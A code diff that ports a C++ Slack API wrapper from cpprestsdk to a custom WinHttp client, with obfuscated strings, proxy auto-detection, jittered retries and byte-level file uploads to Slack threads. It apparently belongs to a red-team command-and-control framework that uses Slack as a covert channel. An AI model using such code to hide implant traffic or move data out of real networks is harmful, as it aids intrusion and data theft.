@@ -1,16 +1,29 @@
 #include "stdafx.h"
 #include "SlackApi.h"
 #include "Common/FSecure/CppTools/StringConversions.h"
+#include "Common/FSecure/WinHttp/HttpClient.h"
+#include "Common/FSecure/WinHttp/Constants.h"
+#include "Common/FSecure/WinHttp/Uri.h"
 #include <random>
 #include <cctype>
 #include <algorithm>
 
 using namespace FSecure::StringConversions;
+using namespace FSecure::WinHttp;
+
+namespace
+{
+	// FIXME replace with string conversions
+	std::wstring ToWideString(std::string const& str)
+	{
+		return Convert<Utf16>(str);
+	}
+}
 
 FSecure::Slack::Slack(std::string const& token, std::string const& channelName)
 {
 	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
-		this->m_HttpConfig.set_proxy(winProxy == OBF(L"auto") ? web::web_proxy::use_auto_discovery : web::web_proxy(winProxy));
+		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);
 
 	this->m_Token = token;
 
@@ -104,7 +117,7 @@ std::vector<std::pair<std::string, std::string>> FSecure::Slack::ReadReplies(std
 		return {};
 
 	json const& messages = output[OBF("messages")];
-	if (!messages[0].contains(OBF("reply_count")) || !messages[0][OBF("reply_count")].get<int>())
+	if (!messages[0].value(OBF("reply_count"), 0))
 		return {};
 
 	std::vector<std::pair<std::string, std::string>> ret;
@@ -204,28 +217,26 @@ void FSecure::Slack::DeleteMessage(std::string const& timestamp)
 	SendJsonRequest(url, j);
 }
 
-std::string FSecure::Slack::SendHttpRequest(std::string const& host, std::string const& contentType, std::string const& data)
+FSecure::ByteVector FSecure::Slack::SendHttpRequest(std::string const& host, std::optional<WinHttp::ContentType> contentType /* = {} */, std::string const& data /* = "" */)
 {
 	while (true)
 	{
-		web::http::client::http_client webClient(Convert<Utf16>(host), this->m_HttpConfig);
-		web::http::http_request request; // default request is GET
+		HttpClient webClient(ToWideString(host), m_ProxyConfig);
+		HttpRequest request; // default request is GET
 
-		if (!data.empty())
+		if (contentType && !data.empty())
 		{
-			request.set_method(web::http::methods::POST);
-
-			request.headers().set_content_type(Convert<Utf16>(contentType));
-			request.set_body(Convert<Utf16>(data));
+			request.m_Method = Method::POST;
+			request.SetData(*contentType, { data.begin(), data.end() });
 		}
 
-		request.headers().add(OBF(L"Authorization"), OBF(L"Bearer ") + Convert<Utf16>(this->m_Token));
+		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
 
-		web::http::http_response resp = webClient.request(request).get();
+		auto resp = webClient.Request(request);
 
-		if (resp.status_code() == web::http::status_codes::OK)
-			return resp.extract_utf8string().get();
-		else if (resp.status_code() == web::http::status_codes::TooManyRequests)
+		if (resp.GetStatusCode() == StatusCode::OK)
+			return resp.GetData();
+		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
 			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
 		else
 			throw std::exception(OBF("[x] Non 200/429 HTTP Response\n"));
@@ -234,22 +245,21 @@ std::string FSecure::Slack::SendHttpRequest(std::string const& host, std::string
 
 json FSecure::Slack::SendJsonRequest(std::string const& url, json const& data)
 {
-	return json::parse(SendHttpRequest(url, OBF("application/json"), data.dump()));
+	return json::parse(SendHttpRequest(url, ContentType::ApplicationJson, data.dump()));
 }
 
-void FSecure::Slack::UploadFile(std::string const& data, std::string const& ts)
+void FSecure::Slack::UploadFile(ByteView data, std::string const& ts)
 {
 	std::string url = OBF_STR("https://slack.com/api/files.upload?") + OBF("&channels=") + this->m_Channel + OBF("&thread_ts=") + ts;
 
-	std::string encoded = Convert<Utf8>(web::http::uri::encode_data_string(Convert<Utf16>(data)));
+	std::string toSend = OBF("filename=test5&content=") + Uri::EncodeData(data);;
 
-	std::string toSend = OBF("filename=test5&content=") + encoded;
-
-	SendHttpRequest(url, OBF("application/x-www-form-urlencoded"), toSend);
+	SendHttpRequest(url, ContentType::ApplicationXWwwFormUrlencoded, toSend);
 }
 
 
 std::string FSecure::Slack::GetFile(std::string const& url)
 {
-	return SendHttpRequest(url, "", "");
+	auto data = SendHttpRequest(url);
+	return { data.begin(), data.end() };
 }
